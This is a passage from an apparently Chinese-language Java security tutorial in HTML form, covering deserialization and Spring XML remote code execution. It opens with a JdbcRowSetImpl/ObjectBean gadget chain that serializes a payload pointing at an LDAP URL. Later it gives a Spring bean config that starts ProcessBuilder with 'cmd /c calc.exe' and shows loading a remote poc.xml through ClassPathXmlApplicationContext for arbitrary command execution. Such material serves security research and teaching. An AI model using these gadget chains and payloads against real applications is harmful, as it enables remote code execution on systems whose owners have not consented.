function_">getObject</span><span class="params">(String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">innerBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(JdbcRowSetImpl.class, jdbcRowSet);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">outerBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, innerBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">triggerSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        triggerSet.add(outerBean);</span><br><span class="line"></span><br><span class="line">        jdbcRowSet.setDataSourceName(url);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> triggerSet;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String url) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(getObject(url));</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;ldap://127.0.0.1:8099/aaa&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><h2 id="XML-é…ç½®-RCE"><a href="#XML-é…ç½®-RCE" class="headerlink" title="XML é…ç½® RCE"></a>XML é…ç½® RCE</h2><h3 id="Spring-XML-Bean"><a href="#Spring-XML-Bean" class="headerlink" title="Spring XML Bean"></a>Spring XML Bean</h3><p>Spring çš„ XML æœ¬è´¨æ˜¯åœ¨æè¿°â€œ<strong>æ€ä¹ˆæŠŠå¯¹è±¡é€ å‡ºæ¥ï¼ˆå®ä¾‹åŒ–ï¼‰</strong>ã€<strong>æ€ä¹ˆç»™å®ƒæ³¨å…¥å‚æ•°ï¼ˆæ„é€ å™¨&#x2F;Setter&#x2F;é›†åˆï¼‰</strong>ã€ä»¥åŠ<strong>åœ¨åˆé€‚çš„ç”Ÿå‘½å‘¨æœŸç‚¹è°ƒç”¨å“ªäº›æ–¹æ³•</strong>â€ã€‚</p>
<h4 id="XML-è£…é…è¿‡ç¨‹"><a href="#XML-è£…é…è¿‡ç¨‹" class="headerlink" title="XML è£…é…è¿‡ç¨‹"></a>XML è£…é…è¿‡ç¨‹</h4><p>Spring XML è£…é…æ—¶ä¼šæœ‰å¦‚ä¸‹è¿‡ç¨‹ï¼š</p>
<ol>
<li><strong>å®ä¾‹åŒ–</strong>ï¼šæŒ‰ <code>&lt;bean class=&quot;...&quot;&gt;</code> æˆ– <code>factory-method</code> åˆ›å»ºå¯¹è±¡</li>
<li><strong>æ³¨å…¥</strong>ï¼šæŒ‰ <code>&lt;constructor-arg&gt;</code>ã€<code>&lt;property&gt;</code>ã€é›†åˆï¼ˆ<code>&lt;list&gt;/&lt;map&gt;</code> ç­‰ï¼‰æŠŠå‚æ•°å¡è¿›å»</li>
<li><strong>åˆå§‹åŒ–å›è°ƒ</strong>ï¼šæ‰§è¡Œ <code>init-method</code>ã€<code>InitializingBean#afterPropertiesSet()</code>ã€å„ç±» <code>*PostProcessor</code>ï¼ˆè¿™ä¸€æ­¥å°±å¯èƒ½â€œæ‰§è¡Œæ–¹æ³•â€ï¼‰</li>
<li><strong>é”€æ¯å›è°ƒ</strong>ï¼ˆå®¹å™¨å…³é—­æ—¶ï¼‰ï¼š<code>destroy-method</code>ã€<code>DisposableBean#destroy()</code></li>
</ol>
<h4 id="å¸¸ç”¨è¯­æ³•"><a href="#å¸¸ç”¨è¯­æ³•" class="headerlink" title="å¸¸ç”¨è¯­æ³•"></a>å¸¸ç”¨è¯­æ³•</h4><p>è¿™é‡Œä¸»è¦ä»‹ç»ä¸å‘½ä»¤æ‰§è¡Œç›¸å…³çš„è¯­æ³•ã€‚</p>
<h5 id="å®ä¾‹åŒ–ç±»"><a href="#å®ä¾‹åŒ–ç±»" class="headerlink" title="å®ä¾‹åŒ–ç±»"></a>å®ä¾‹åŒ–ç±»</h5><p>å¯¹äºæ˜äº†çš„ä¸€ä¸ª <code>&lt;bean&gt;</code> æ ‡ç­¾ï¼ŒSpring åœ¨è§£ææ—¶ä¼šå®ä¾‹åŒ–ä¸€ä¸ªå¯¹åº”çš„å¯¹è±¡ã€‚</p>
<p>Spring å®ä¾‹åŒ– Bean ä¸»è¦æœ‰ä¸‰æ¡è·¯å¾„ï¼š</p>
<table>
<thead>
<tr>
<th><code>&lt;bean&gt;</code> é‡Œçš„å±æ€§</th>
<th>æ„é€ æ–¹å¼</th>
<th>è°ƒç”¨å½¢å¼</th>
<th><code>constructor-arg</code> çš„ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td>åªæœ‰ <code>class=&quot;...&quot;</code>ï¼ˆ<strong>æ²¡æœ‰</strong> <code>factory-method</code> &#x2F; <code>factory-bean</code>ï¼‰</td>
<td><strong>æ„é€ å‡½æ•°</strong></td>
<td><code>new Class(arg1, arg2, ...)</code></td>
<td>ä¼ ç»™<strong>æ„é€ å™¨</strong>çš„å‚æ•°</td>
</tr>
<tr>
<td>å†™äº† <code>class=&quot;...&quot;</code> <strong>å¹¶ä¸”</strong> <code>factory-method=&quot;...&quot;</code>ï¼ˆ<strong>æ²¡æœ‰</strong> <code>factory-bean</code>ï¼‰</td>
<td><strong>é™æ€å·¥å‚æ–¹æ³•</strong></td>
<td><code>Class.factoryMethod(arg1, arg2, ...)</code></td>
<td>ä¼ ç»™<strong>é™æ€å·¥å‚æ–¹æ³•</strong>çš„å‚æ•°</td>
</tr>
<tr>
<td>å†™äº† <code>factory-bean=&quot;beanId&quot;</code> <strong>å¹¶ä¸”</strong> <code>factory-method=&quot;...&quot;</code></td>
<td><strong>å®ä¾‹å·¥å‚æ–¹æ³•</strong></td>
<td><code>ctx.getBean(&quot;beanId&quot;).factoryMethod(arg1, arg2, ...)</code></td>
<td>ä¼ ç»™<strong>å®ä¾‹å·¥å‚æ–¹æ³•</strong>çš„å‚æ•°</td>
</tr>
</tbody></table>
<p>ä¾‹å¦‚ä¸‹é¢è¿™ä¸ª <code>&lt;bean&gt;</code> ä¼šé€šè¿‡è°ƒç”¨è°ƒç”¨æ„é€ å‡½æ•°çš„å½¢å¼å®ä¾‹åŒ– <code>example.Engine</code>ã€‚</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;engine&quot;</span> <span class="attr">class</span>=<span class="string">&quot;example.Engine&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span> <span class="attr">value</span>=<span class="string">&quot;150&quot;</span>/&gt;</span>     <span class="comment">&lt;!-- æŒ‰ä½ç½®/ç±»å‹/åå­—éƒ½å¯ä»¥ --&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- &lt;constructor-arg type=&quot;int&quot; value=&quot;150&quot;/&gt; --&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- &lt;constructor-arg name=&quot;horsepower&quot; value=&quot;150&quot;/&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>åœ¨å®ä¾‹åŒ–å¯¹è±¡çš„è¿‡ç¨‹ä¸­è¿˜éœ€è¦ç»™å¯¹è±¡åˆå§‹åŒ–å±æ€§ï¼Œé™¤äº†æ„é€ å‡½æ•°çš„å‚æ•°å¤–ï¼Œè¿˜æœ‰å¯ä»¥é€šè¿‡ Setter æ³¨å…¥ï¼ˆå±æ€§æ³¨å…¥ï¼‰ï¼š</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;car&quot;</span> <span class="attr">class</span>=<span class="string">&quot;example.Car&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;init&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;engine&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;engine&quot;</span>/&gt;</span>       <span class="comment">&lt;!-- æ³¨å…¥å¦ä¸€ä¸ª bean --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;brand&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;SpringCar&quot;</span>/&gt;</span>  <span class="comment">&lt;!-- æ³¨å…¥å­—é¢é‡ --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>æ³¨å…¥çš„å‚æ•°æ”¯æŒåˆ—è¡¨ç­‰å¸¸è§å®¹å™¨ï¼š</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;catalog&quot;</span> <span class="attr">class</span>=<span class="string">&quot;example.Catalog&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;tags&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span>&gt;</span>eco<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span>&gt;</span>sport<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;settings&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">&quot;endpoint&quot;</span> <span class="attr">value</span>=<span class="string">&quot;https://api.example.com&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">&quot;timeoutMs&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2000&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h5 id="è°ƒç”¨æ–¹æ³•"><a href="#è°ƒç”¨æ–¹æ³•" class="headerlink" title="è°ƒç”¨æ–¹æ³•"></a>è°ƒç”¨æ–¹æ³•</h5><ul>
<li><p><code>init-method</code> &#x2F; <code>destroy-method</code>ï¼ˆç”Ÿå‘½å‘¨æœŸå›è°ƒï¼‰</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;car&quot;</span> <span class="attr">class</span>=<span class="string">&quot;example.Car&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;init&quot;</span> <span class="attr">destroy-method</span>=<span class="string">&quot;shutdown&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>å®¹å™¨<strong>åˆ·æ–°</strong>æ—¶ä¼šè°ƒ <code>car.init()</code>ï¼›å®¹å™¨<strong>å…³é—­</strong>æ—¶è°ƒ <code>car.shutdown()</code>ã€‚</p>
</li>
<li><p><code>factory-method</code> &#x2F; <code>factory-bean</code>ï¼ˆå·¥å‚æ–¹æ³•ï¼‰</p>
<ul>
<li><p>é™æ€å·¥å‚æ–¹æ³•</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;clock&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.time.Clock&quot;</span> <span class="attr">factory-method</span>=<span class="string">&quot;systemUTC&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è§£é‡Šï¼šä¸æ˜¯ <code>new Clock()</code>ï¼Œè€Œæ˜¯è°ƒç”¨ <code>Clock.systemUTC()</code>ï¼ˆ<strong>é™æ€</strong>ï¼‰ã€‚</p>
</li>
<li><p>å®ä¾‹å·¥å‚æ–¹æ³•</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;factory&quot;</span> <span class="attr">class</span>=<span class="string">&quot;example.MyFactory&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;product&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">factory-bean</span>=<span class="string">&quot;factory&quot;</span> <span class="attr">factory-method</span>=<span class="string">&quot;createProduct&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">&quot;demo&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è§£é‡Šï¼šå…ˆ <code>new MyFactory()</code>ï¼Œå†è°ƒå®ä¾‹æ–¹æ³• <code>factory.createProduct(&quot;demo&quot;)</code>ã€‚</p>
</li>
</ul>
</li>
<li><p><code>MethodInvokingFactoryBean</code>ï¼ˆæŠŠâ€œæ–¹æ³•çš„è¿”å›å€¼â€å½“æˆ beanï¼‰</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- è°ƒç”¨é™æ€æ–¹æ³•ï¼šInstant.now() --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;now&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;targetClass&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;java.time.Instant&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;targetMethod&quot;</span> <span class="attr">value</span>=<span class="string">&quot;now&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- æˆ–è°ƒç”¨å¯¹è±¡æ–¹æ³•ï¼šuuid.toString() --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;uuid&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;targetClass&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;java.util.UUID&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;targetMethod&quot;</span> <span class="attr">value</span>=<span class="string">&quot;randomUUID&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;uuidStr&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;targetObject&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;uuid&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;targetMethod&quot;</span> <span class="attr">value</span>=<span class="string">&quot;toString&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>SpEL è¡¨è¾¾å¼</p>
<p>XML Bean ä¸­çš„å±æ€§æ”¯æŒ SpEL è¡¨è¾¾å¼ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°† SpEL è¡¨è¾¾å¼åº”ç”¨è¿›æ¥ã€‚</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;greeting&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123;&#x27;Hello, &#x27; + @userService.defaultName()&#125;&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="å‡ºç½‘åˆ©ç”¨"><a href="#å‡ºç½‘åˆ©ç”¨" class="headerlink" title="å‡ºç½‘åˆ©ç”¨"></a>å‡ºç½‘åˆ©ç”¨</h3><p>åœ¨ spring ä¸­æœ‰ä¸‹é¢ä¸¤ä¸ªå‡½æ•°ç”¨æ¥<strong>è¯»ä¸€ä»½ï¼ˆæˆ–å¤šä»½ï¼‰Spring XML é…ç½®</strong>ï¼Œç„¶å<strong>åˆ›å»ºå¹¶ç®¡ç†é‡Œè¾¹å®šä¹‰çš„ bean</strong>ï¼ˆå®ä¾‹åŒ–ã€ä¾èµ–æ³¨å…¥ã€è°ƒç”¨åˆå§‹åŒ–&#x2F;é”€æ¯å›è°ƒç­‰ï¼‰ï¼š</p>
<ul>
<li><code>org.springframework.context.support.ClassPathXmlApplicationContext</code></li>
<li><code>org.springframework.context.support.FileSystemXmlApplicationContext</code></li>
</ul>
<p>å…¶ä¸­ï¼š</p>
<ul>
<li><code>ClassPathXmlApplicationContext</code> é»˜è®¤<strong>ä» classpath</strong> è¯»å– XMLï¼ˆæ‰“åŒ…åœ¨ jar æˆ– <code>target/classes</code> é‡Œçš„èµ„æºï¼‰ã€‚é€‚åˆâ€œåº”ç”¨è‡ªå¸¦çš„å†…ç½®é…ç½®â€ï¼›</li>
<li><code>FileSystemXmlApplicationContext</code> é»˜è®¤<strong>ä»æ–‡ä»¶ç³»ç»Ÿ</strong> è¯»å– XMLï¼ˆç£ç›˜è·¯å¾„ï¼Œå¦‚ <code>/etc/app/beans.xml</code>ï¼‰ã€‚é€‚åˆâ€œå¤–ç½®ã€å¯æ›¿æ¢çš„é…ç½®â€ã€‚</li>
</ul>
<p>ä¹Ÿå°±æ˜¯è¯´äºŒè€…åŒºåˆ«å…³é”®åœ¨<strong>â€œæ²¡å†™å‰ç¼€æ—¶é»˜è®¤å»å“ªæ‰¾â€</strong>ï¼Œé™¤æ­¤ä¹‹å¤–äºŒè€…æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚åœ¨ Java å®‰å…¨ä¸­å¦‚æœæˆ‘ä»¬èƒ½è°ƒç”¨ä»»æ„ç±»çš„å•å‚æ•°æ„é€ å‡½æ•°ä¸”å‚æ•°å¯æ§æˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘åˆ©ç”¨è¿™ä¸¤ä¸ªå‡½æ•°<strong>åŠ è½½ Spring XML é…ç½®å®ç° RCE</strong>ã€‚</p>
<p>é¦–å…ˆæ„é€ ä¸€ä¸ªåŠ è½½å³å¯ RCE çš„ Spring XML Bean é…ç½®æ–‡ä»¶ï¼š</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">&quot;http://www.springframework.org/schema/p&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;foo&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>/c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[calc.exe]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªé…ç½®æ–‡ä»¶åŠ è½½åç­‰ä»·äºæ‰§è¡Œä¸‹é¢è¿™æ®µä»£ç ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ProcessBuilder</span> <span class="variable">foo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(Arrays.asList(<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;calc.exe&quot;</span>));</span><br><span class="line">foo.start();</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <p>è¿™é‡Œç”¨çš„æ˜¯ <code>&lt;list&gt;</code>ï¼Œæ‰€ä»¥ Spring é€‰çš„æ˜¯ <code>ProcessBuilder(List&lt;String&gt; command)</code> è¿™ä¸ªæ„é€ å™¨ã€‚</p>
<p>å¦‚æœ XML å†™æˆ <code>&lt;constructor-arg value=&quot;calc&quot;/&gt;</code>ï¼Œé‚£ä¼šèµ° <code>ProcessBuilder(String... command)</code>ï¼ˆå¯å˜å‚æ•°ï¼‰æ„é€ å™¨ï¼Œç›¸å½“äº <code>new ProcessBuilder(&quot;calc&quot;).start();</code>ã€‚</p>
<p>ç”¨ <strong>CDATA</strong> åŒ…ä½å€¼å¯ä»¥ç¡®ä¿<strong>æŠŠè¿™æ®µæ–‡æœ¬â€œæŒ‰åŸæ ·â€äº¤ç»™ Spring&#x2F;XML è§£æå™¨ï¼Œä¸è®©å®ƒå½“ä½œ XML æ ‡è®°å»å¤„ç†ï¼Œä¹Ÿå…å»æ‰‹åŠ¨è½¬ä¹‰</strong>ã€‚</p>

    </div>
  </div>

<p>æ­¤æ—¶æƒ³åŠæ³•æ‰§è¡Œä¸‹é¢ä»»æ„ä¸€è¡Œä»£ç çš„ç­‰æ•ˆä»£ç å³å¯åŠ è½½è¿œç¨‹çš„ <code>poc.xml</code> å®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">org</span>.springframework.context.support.ClassPathXmlApplicationContext(<span class="string">&quot;http://127.0.0.1:8000/poc.xml&quot;</span>);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">org</span>.springframework.context.support.FileSystemXmlApplicationContext(<span class="string">&quot;http://127.0.0.1:8000/poc.xml&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h3 id="ä¸å‡ºç½‘åˆ©ç”¨"><a href="#ä¸å‡ºç½‘åˆ©ç”¨" class="headerlink" title="ä¸å‡ºç½‘åˆ©ç”¨"></a>ä¸å‡ºç½‘åˆ©ç”¨</h3><p><code>ClassPathXmlApplicationContext</code> æ‰€æœ‰çš„æ„é€ å‡½æ•°æœ€åéƒ½ä¼šè¿›å…¥ä¸‹é¢è¿™ä¸ªæ„é€ å‡½æ•°ä¸­ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ClassPathXmlApplicationContext</span><span class="params">(String[] configLocations, <span class="type">boolean</span> refresh, ApplicationContext parent)</span></span><br><span class="line">        <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">super</span>(parent);</span><br><span class="line">    setConfigLocations(configLocations);</span><br><span class="line">    <span class="keyword">if</span> (refresh) &#123;</span><br><span class="line">        refresh();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

